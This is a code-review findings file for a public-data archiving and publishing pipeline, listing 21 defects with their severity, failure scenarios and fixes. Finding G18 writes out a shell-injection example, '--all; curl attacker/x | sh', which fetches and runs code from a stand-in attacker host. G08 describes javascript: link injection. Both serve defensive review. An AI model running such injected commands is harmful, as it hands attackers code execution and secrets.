# REVIEW-BUILD04 — confirmed findings (2026-07-30)

*BUILD-04 publish-path adversarial review + independent SPEC-08 §5 hostile confirmation of the NHTSA v1 failure (workflow `wf_5709ba5c-26c`).*
*21 confirmed; 1 dismissed.*

**Independent hostile-confirmation verdict (NHTSA v1):** CONFIRMS-FAILURE-ANALYSIS — the independent pass re-verified leakage handling, base-rate math, the dumb-baseline comparison, and threshold/registration ancestry (git-checked again in this synthesis: e3d4d84 sole pre-registration commit, results first at 421a9bb) and found only conservative wording and provenance-citation defects; nothing flips any bar or rescues the index.

**Synthesis summary:** 29 raw findings from 4 reviewers -> 21 confirmed after merging 8 duplicates across dimensions and dismissing 1 false positive (the 'vacuous assert' in collectors/tests/test_cms_pbj.py:236 — the os.walk over raw/ on the next lines does catch a manifest written for a drifted release, so the claimed coverage hole is not reachable; the `or True` line is dead code worth a trivial cleanup only). All surviving findings were verified against the code: reviewer 1's two reproduced fail-closed bypasses (torn artifacts.json renders all numbers with zero receipts; require_receipt never checks claim-evidence agreement, and compile_all's non-atomic end-of-run writes make the torn state reachable) plus the compile.py write-ordering, the cms-pbj heartbeat/dup-streak/fleetgreen-pause trio (a persistent drift or pause on the current quarter goes fully silent after one alarm), the fail-open Track Record scorecard surface (silent FAIL erasure, no validation gate, no render tests — the project's stated moat is its least-guarded surface), javascript: URL injection at the render layer, duplicate-quarter first-wins release identity, non-resumable backfill, the stale BUDGET ledger (fired trigger not executed), the raw workflow-input interpolation, and four credibility-surface defects on the NHTSA artifacts (57.8% wording, hostile-review same-commit ordering claim, wrong freeze-commit citation, two unreproducible digits) — git history checks in this synthesis confirmed the provenance facts. Severity order: 1 critical, 3 high, 10 medium, 7 low. Top pre-acceptance fixes: strict artifacts.json loading + claim-vs-bundle assertion in require_receipt, scorecard fail-closed loader + validation gate with render tests, and the cms-pbj heartbeat/streak fixes. Hostile confirmation: the NHTSA v1 failure analysis holds (CONFIRMS).

*This file is the W-007c fix-worker's spec: fix + regression-test, or dismiss/defer with reasons in the buildlog. BUILD-04 acceptance is blocked until every finding has a disposition; findings touching `fleetgreen`/`cms_pbj` also sit under the ⚑ #215 (2026-08-04) BUILD-01 acceptance evidence.*

## G01 · CRITICAL · `sitegen/build.py:680`
*Raised by: publish-path correctness*

**Defect:** Receipts gate is keyed entirely off artifacts.json enumeration; _load (lines 126-131) swallows parse errors, so a missing or corrupt artifacts.json while warn.json/postings.json survive renders every numeric surface (WARN notice tables, per-state totals, posting diff counts) with zero receipts on disk and the build succeeds.

**Failure scenario:** Reproduced by reviewer 1 against the fixture pipeline: delete site/data/artifacts.json and site/receipts/, rerun build() — full notice tables and diff counts render, build green. Also reproduced with merge-conflict junk in artifacts.json. Reachable whenever the derived layer is partially present (compile crash between writes, deploy cache, manual cleanup) — verified: compile_all writes the three JSONs non-atomically at the end (artifacts/compile.py:326-332).

**Fix:** Strict-load artifacts.json (raise on exists-but-unparseable; empty default only when warn/postings are also absent); cross-check that every state/board carrying numbers has its artifact in the receipt-checked set and that the generated/code_ref stamps of the three JSONs match; add the regression test mirroring the repro.

## G02 · HIGH · `sitegen/build.py:138`
*Raised by: publish-path correctness*

**Defect:** require_receipt validates only that a bundle exists and is internally complete — it never checks the artifact's rendered claim (number, as_of, index_version, text) against the bundle it links, so a number contradicting its own receipt renders and the gate passes.

**Failure scenario:** Reproduced: an artifact number inflated 10x vs its own bundle renders on the receipt page directly above the un-inflated bundle table, build green. Reachable without hand-editing: receipts are written incrementally in _publish (compile.py:109) but warn/postings/artifacts JSONs only at run end and non-atomically, so a crash mid-compile leaves fresh bundles under a stale artifacts.json — next build publishes stale numbers over contradicting receipts, in pages and both feeds.

**Fix:** In require_receipt, load the bundle and assert number/as_of/index_version match the artifact and that the number appears in the text (or re-render from templates and compare); raise UnreceiptedNumber on mismatch. Make compile_all write the three JSONs to temp files and rename atomically after all publishes. Shares a root cause with the critical finding: the gate trusts the derived layer instead of checking claim-evidence agreement.

## G03 · HIGH · `collectors/cms_pbj.py:293`
*Raised by: SPEC-03 fail-closed posture*

**Defect:** run_fleet pings the healthcheck SUCCESS and exits 0 on runs whose only results are 'paused' or 'quarantined-dup', because ok=(quarantined==0 and not empty) and the quarantined tally counts only 'quarantined'/'error' — the collector reports alive while collecting nothing.

**Failure scenario:** Verified in code: a paused 2026Q1 (fetch-3x) makes every subsequent 2x/week firing a no-op that pings the dead-man green and exits 0 forever; a persistently drifted release hits the dup branch, flips the HC back UP after one alarm, and Actions stays green. Exactly the silent-stop-reads-alive failure SPEC-03 §1 ('pings only after a validated snapshot is stored') exists to prevent.

**Fix:** Treat 'paused' and 'quarantined-dup' as non-success for the heartbeat: withhold the ping (matching the framework Collector's withheld(paused)/withheld(drift) precedent) so the HC grace window fires; keep exit 0 for dup runs if red-run spam is a concern, but never ping success.

## G04 · HIGH · `sitegen/build.py:108`
*Raised by: publish-path correctness + test adequacy (2 reviewers)*

**Defect:** _scorecards silently drops any scorecard.json that fails to parse (except Exception: pass), so the published NHTSA FAIL can vanish from the public Track Record without failing the build — and no test renders any scorecard row, so the erasure ships green.

**Failure scenario:** A truncated/corrupt retrocast/nhtsa-recalls/results/v1/scorecard.json (bad merge, partial write, glob/rename regression): next build succeeds, Track Record renders 'No published scorecards yet' while the home page (lines 234-238) still hardcodes 'it is published as a failure... on the Track Record' — the live site contradicts itself and a permanent public failure record disappears, violating 'Failures stay on this page permanently'. test_site.py asserts only the words 'Track Record'.

**Fix:** Distinguish absent from broken: a scorecard that exists but fails json.load or lacks required keys must raise and abort the build. Add tests: (a) build against the real repo root asserting track-record.html contains 'nhtsa-recalls', a FAIL pill, and the pr_auc value; (b) a corrupt scorecard in a fixture root makes the build refuse.

## G05 · MEDIUM · `collectors/cms_pbj.py:215`
*Raised by: SPEC-03 §2*

**Defect:** The quarantined-dup branch never increments fail_streak, so the '3 consecutive drifts -> auto-pause + gate' rule can never trigger for the collector's own documented threat model: CMS overwrites in place, so a persistent drifted release presents identical bytes on every probe and the streak sticks at 1.

**Failure scenario:** CMS renames PROVNUM in 2026Q1: probe 1 quarantines (streak=1), probes 2..N hit the dup branch which only updates last_run/last_action — no pause, no needs_gate, no gate filed, ever. Combined with the heartbeat defect, a permanent schema drift produces exactly one alarm and then every signal goes and stays green while zero valid data is archived.

**Fix:** Count a recurring identical drifted payload toward the streak: call _quarantine(rec, 'quarantined-dup') in the dup branch (keeping no-re-store/no-re-alarm) so 3 consecutive drifted probes pause the quarter and surface needs_gate via _fleet_gate.

## G06 · MEDIUM · `opscore/fleetgreen.py:103`
*Raised by: SPEC-01 §6*

**Defect:** score() detects a pause only via node-level state['paused'], but cms_pbj pauses at the quarter level and publishes only paused_quarters — it never sets node-level 'paused' — so a cms-pbj pause is invisible to the fleet-green verdict once any later run commits a different last_action.

**Failure scenario:** Verified: 2026Q1 paused; the moment any run stores/dedupes another quarter, committed node last_action becomes 'stored', paused_quarters=['2026Q1'] is ignored, and score() returns GREEN — the constitutional 'all enabled collectors green 7 days' criterion closes leniently while a quarter sits paused pending an operator gate. Currently reads QUARANTINED only by accident of the persist step's unchanged-commit skip.

**Fix:** In score(), compute paused = bool(state.get('paused')) or bool(state.get('paused_quarters')); and/or have run_fleet set node['paused']=bool(paused) so the existing consumer works unchanged.

## G07 · MEDIUM · `sitegen/build.py:256`
*Raised by: publish-path correctness + test adequacy (2 reviewers, 4 raw findings merged)*

**Defect:** The scorecard render path has no validation gate: the 'pre-registered and frozen in public' banner is asserted with zero machine verification (no registration_commit / provenance / pre-registration-exists checks), the pill renders PASS for any truthy pass value, pass-vs-pass_detail consistency is never checked, and no test opens the committed scorecard to tie it to the frozen lexicon.BARS.

**Failure scenario:** A future scorecard from a dirty tree or with registration_is_ancestor_of_code:false renders under the pre-registered banner, making the page's central falsifiability claim publicly false; a hand-edited or partially-rerun committed scorecard whose pass field contradicts pass_detail (or whose pass arrives as the string 'false') renders a green PASS — and no test in either suite fails, because none validates the committed artifact or the render gate.

**Fix:** In track_record/_scorecards, refuse any scorecard missing registration_commit, with provenance dirty==true or ancestry false, whose index lacks a discovered pre-registration, whose pass is not a bool, or whose pass != all(pass_detail.values()). Add the tripwire test loading results/v1/scorecard.json asserting bars==lexicon.BARS, pass-consistency, and vintage pins; add a two-scorecard fixture pinning dual-pill rendering and ordering. Current NHTSA v1 card passes all checks — purely additive enforcement.

## G08 · MEDIUM · `sitegen/build.py:561`
*Raised by: publish-path correctness*

**Defect:** Posting URLs from third-party ATS payloads are rendered into href attributes with html.escape only, which does not neutralize javascript:/data: schemes — an archived hostile board payload becomes an executable link on theexhaust.org (same pattern for source_url at lines 574 and 496).

**Failure scenario:** A compromised or spoofed unauthenticated ATS endpoint returns absolute_url='javascript:...'; the collector archives it faithfully (correct — engines/ats.py passes URLs through verbatim), the compiler diffs it, and the board page publishes a clickable javascript: link on the public site. The pipeline is built for hostile inputs at the archive layer but the render layer trusts them.

**Fix:** Add _safe_href(url) returning the escaped url only when it starts with http:// or https:// (else render the title as plain text); use at build.py:561, 574, 496. Add a fixture test with a javascript: URL in a board payload.

## G09 · MEDIUM · `collectors/cms_pbj.py:123`
*Raised by: SPEC/covenant + test adequacy (2 reviewers)*

**Defect:** resolve_releases resolves two distributions claiming the same quarter by silently keeping whichever the catalog lists first (the loser lands in a 'duplicates' key no caller or state field ever reads), and the URL-derived quarter is never cross-checked against the title-derived quarter. No test exercises a duplicate-quarter catalog.

**Failure scenario:** During a CMS transition the catalog lists both the old and the corrected 2026Q1 CSV with the stale file first: the collector permanently archives the stale bytes as the quarter's vintage with action=stored, no alarm — the revision event this collector exists to catch is never fetched or surfaced. A spurious YYYY_Q# segment in a future URL path can mis-file a quarter and drop a genuine release as a 'duplicate', corrupting the release boundary BUILD-05 depends on.

**Fix:** When both parsers yield a quarter, require agreement (disagreement -> unidentifiable -> alarm). When two distributions map to one quarter, surface it in the run result/state (e.g. node['ambiguous_quarters']) with alarm=True so it exits nonzero. Add the two-distribution test pinning whichever contract is chosen.

## G10 · MEDIUM · `collectors/cms_pbj.py:288`
*Raised by: SPEC/covenant + test adequacy (2 reviewers)*

**Defect:** Health state is dumped once after the entire fleet loop, so a killed --all backfill persists nothing: every per-quarter last_hash baseline is lost, and KeyboardInterrupt (BaseException) escapes the per-release 'except Exception' before the dump. No interruption test exists.

**Failure scenario:** The 37-release ~8.7 GB backfill is killed at release 30: the always() persist step commits an unwritten file; the rerun finds empty quarter records, re-downloads all 37 files (the politeness cost the collector exists to avoid) and re-stores byte-identical snapshots — same-day reruns append duplicate sha256 entries to quarter manifests (fname keyed on HHMM), next-day reruns create spurious second vintages of unchanged releases in the immutable archive.

**Fix:** Flush the health file after each release iteration (and/or dedupe against the quarter's existing manifest hashes before put). Add a test that kills run_fleet with a BaseException after N stores, reruns, and asserts no re-fetch of stored quarters and no duplicate manifest sha256 entries.

## G11 · MEDIUM · `ops/state/BUDGET.json:31`
*Raised by: SPEC-04 §4 / SPEC-01 §6*

**Defect:** BUDGET.json's own re_project_trigger 'any collector added to the roster' fired at W-007b (cms-pbj entered the fleet, ~61 MB already stored per committed state) but was not executed: updated=2026-07-28 predates the collector, by_collector_bytes has no raw/cms-pbj line, and the sanctioned --all backfill adds ~1.1 GB stored — more than the entire current 0.79 GB bucket — with no projection update.

**Failure scenario:** The operator dispatches the backfill; R2 jumps to ~1.9 GB while the budget drift detector and the covenant's spend-visibility guarantee read a ledger omitting the newest and second-largest storage line; the free-tier-exhausted date (~2026-12) and $5/mo bar projection are computed on stale inputs.

**Fix:** Re-run the measured sweep and update by_collector_bytes, r2_gb, growth_projection (cms-pbj: ~30 MB/quarter steady-state + ~1.1 GB one-time backfill) and updated/measured — or commit a dated note that the cms-pbj trigger is pending so it is not silently dropped.

## G12 · MEDIUM · `sitegen/build.py:261`
*Raised by: publish-path correctness*

**Defect:** Track Record rows render PR-AUC and median lead with no link to any evidence (scorecard, results directory, or REPORT.md), never surface leakage_flags or failing pass_detail, and print raw 18-decimal floats — while the home page promises the failure is published 'with the autopsy' and the footer promises 'every number links its receipts'.

**Failure scenario:** Today: the only two retrocast numbers on the site violate the receipts covenant — a critic cannot trace them without knowing the repo layout. Forward: a scorecard with pass:true but non-empty leakage_flags (the NHTSA card carries a 95-lead leakage flag) renders as a clean unqualified PASS — softening by omission on the page whose purpose is unsoftened self-grading.

**Fix:** Link each row to the repo results/{version}/ directory and REPORT.md when present; render leakage_flags and failing pass_detail entries as visible caveats; format metrics (e.g. 0.028).

## G13 · MEDIUM · `retrocast/nhtsa-recalls/REPORT.md:60`
*Raised by: hostile confirmation*

**Defect:** The headline autopsy claim ('57.8% of held-out recall campaigns had no complaint at all in the preceding 26 weeks') misdescribes the computation on three axes: the window includes the event's own week bucket, 'activity' persists ~37 weeks via scored-week trailing windows, and units are joined (cell,week) events with 65% of in-window recall rows excluded from the denominator. All biases are conservative, so the verdict holds, but the most-quotable sentence does not reproduce as worded (recurs in HOSTILE-REVIEW-v1.md, DEAD-REGISTRATIONS.md, and the results commit message).

**Failure scenario:** An outside critic recomputes strict 26-week zero-complaint coverage from the archived vintages, gets a visibly larger number, and publishes that the flagship autopsy figure does not reproduce as described — on the artifact whose thesis is that a critic can rerun everything.

**Fix:** Reword in all three documents to state exactly what was measured (joined (cell,week) events, window ending at and including the report week, a floor not a point estimate); optionally emit the strict-window count as an extra diagnostic in run_v1.py.

## G14 · MEDIUM · `retrocast/nhtsa-recalls/HOSTILE-REVIEW-v1.md:4`
*Raised by: hostile confirmation*

**Defect:** The preamble claims 'results were already written and committed before this review began', but git shows HOSTILE-REVIEW-v1.md, REPORT.md, and results/v1/* all first landed together in commit 421a9bb — the ordering claim is unverifiable from history, on the surface whose thesis is 'git history makes the ordering unforgeable'. Verified independently via git log in this synthesis.

**Failure scenario:** A hostile reader runs git log on the review and the results, finds both born in 421a9bb, and argues the adversarial review could have shaped the results it reviews.

**Fix:** Amend the preamble to the checkable truth (results computed before the review; both landed in 421a9bb; the review changed prose only — the e182fcc/421a9bb scorecard diff is the receipt). Going forward, commit results before starting the hostile-review pass.

## G15 · LOW · `sitegen/build.py:167`
*Raised by: publish-path correctness*

**Defect:** health_banner swallows all exceptions and merged_health (opscore/report.py:30-33, verified) silently skips unreadable health files, so a corrupt ops/state/health/<collector>.json yields no stale banner at all — the stale-data disclosure chain fails open exactly when state files are damaged.

**Failure scenario:** A bad state commit truncates health/warn.json while the warn collector is actually frozen: merged_health skips the file, health_banner returns None, and warn.html publishes with no banner, presenting the last archived vintage as if the pipeline were healthy.

**Fix:** Distinguish 'no health state exists' (no banner) from 'health file exists but is unreadable' -> render a 'freshness cannot be verified' banner; requires merged_health (or a sitegen-side check) to report parse failures instead of dropping them.

## G16 · LOW · `sitegen/feeds.py:33`
*Raised by: publish-path correctness + test adequacy (2 reviewers)*

**Defect:** _rfc822 falls back to datetime.now() on a missing/unparseable as_of — fabricating a publication time (the docstring itself calls this 'a small lie') that shifts on every rebuild — and json_feed emits invalid 'T00:00:00Z' for a blank as_of, which strict JSON-Feed readers can reject the whole feed over. The empty-feed path (what every clean-checkout deploy builds) is never validated as parseable.

**Failure scenario:** Any artifact reaching the feed with a blank as_of (reachable via the torn-derived-layer states above) gets pubDate=build time, re-surfacing as unread on every rebuild in RSS readers, and an invalid date_published in the JSON feed — fail-open in the channel contracted to carry 'the same numbers, same moment'.

**Fix:** Raise on an unparseable as_of for item dates (build() already aborts on bad artifacts) or omit the date element; keep the now() fallback only for channel lastBuildDate with zero artifacts. Add tests parsing feeds.rss([]) and json.loads(feeds.json_feed([])).

## G17 · LOW · `sitegen/build.py:408`
*Raised by: publish-path correctness*

**Defect:** warn.html says '{len(states)} states archived' but the list includes seeded states with parse_status 'no-vintage' — states with no archived snapshot in the window at all — overstating archive coverage on a page whose credibility rests on stating exactly what is held.

**Failure scenario:** Seed grows to 12 states with 3 not yet snapshotted: the page states '12 states archived' when only 9 have any archived vintage, contradicting its own per-row 'no snapshot in window' cells.

**Fix:** Count archived = sum(1 for s in states if s.get('vintages')) and render that, optionally with a 'seeded, no snapshot in window' remainder.

## G18 · LOW · `.github/workflows/_collector.yml:61`
*Raised by: deploy surface*

**Defect:** The workflow_dispatch args input is interpolated raw into the run shell (python -m collectors.cms_pbj ${{ inputs.args }}) — the standard Actions script-injection anti-pattern, in a job holding R2_SECRET_ACCESS_KEY and a contents:write token (inputs.target on line 63 is interpolated too).

**Failure scenario:** Anyone able to dispatch the workflow can pass args like '--all; curl attacker/x | sh' and execute arbitrary shell with archive-write and repo-push capability — turning a run-the-backfill permission into full compromise. Currently mitigated only by the dispatch permission itself.

**Fix:** Pass the input via an env var (env: PBJ_ARGS: ${{ inputs.args }}) and expand $PBJ_ARGS in the script — env expansion word-splits but cannot inject shell syntax.

## G19 · LOW · `retrocast/nhtsa-recalls/REPORT.md:7`
*Raised by: hostile confirmation*

**Defect:** The commit cited as the workbook freeze (d28d8fa) is actually the runner commit — verified via git: the true crosswalk+lexicon freeze is 4a24a39 (2026-07-28T23:10), and lexicon.py was edited again inside d28d8fa; additionally the hand-off rebase rewrote committer dates, so scorecard.json says 2026-07-29 while REPORT/HOSTILE-REVIEW say 2026-07-28, unexplained anywhere. Everything remains strictly pre-results (421a9bb, 00:16), so no integrity breach.

**Failure scenario:** A critic doing the archaeology finds the 'freeze' commit titled as the runner, the frozen module changed after the freeze-titled commit, and freeze dates disagreeing between report and scorecard by a day — and writes it up as sloppy provenance on a project that sells provenance.

**Fix:** Cite 4a24a39 as the freeze and d28d8fa as 'lexicon.py last touched, still pre-results'; add a sentence noting the rebase rewrote committer timestamps; have provenance() record both author and committer dates.

## G20 · LOW · `retrocast/nhtsa-recalls/REPORT.md:66`
*Raised by: hostile confirmation*

**Defect:** Two load-bearing claims rest on computations in no published artifact or committed code path: the train-window coverage figure 0.3983 (run_v1.py computes coverage diagnostics for the test window only) and the independent IRLS/Newton solve said to reproduce coefficients 'to 4 decimals in 9 iterations' (nowhere in the repo; only the gradient norm is reproducible).

**Failure scenario:** A reviewer reruns run_v1.py end-to-end, diffs every emitted number against the report, and finds 0.3983 and the IRLS story unreproducible from the published pipeline — on a first-public-number artifact, any unreproducible digit invites the ShadowStats comparison the project defines itself against.

**Fix:** Add train-side coverage diagnostics to run_v1.py symmetric with the test-side ones and commit the IRLS cross-check as a test or verification script; until then, mark both numbers in REPORT.md as session-side checks not emitted by the pipeline.

## G21 · LOW · `sitegen/tests/test_site.py:313`
*Raised by: test adequacy*

**Defect:** The paused-only branch of health_banner (build.py:181-184, 'Partial coverage') has zero test coverage — the only test touching paused_states asserts that staleness outranks it.

**Failure scenario:** WARN collector healthy overall but WA paused after three fetch failures (the routine quarantine flow the fleet tests prove happens): a regression in the paused branch (health-key rename, merged_health rec lookup) removes the disclosure banner from warn.html and warn/WA.html, presenting WA's last vintage as current coverage, and every existing test still passes.

**Fix:** Add a sibling test: fresh last_success plus paused_states=['WA'], rebuild, assert 'Partial coverage' and 'WA' appear in warn.html and warn/WA.html.
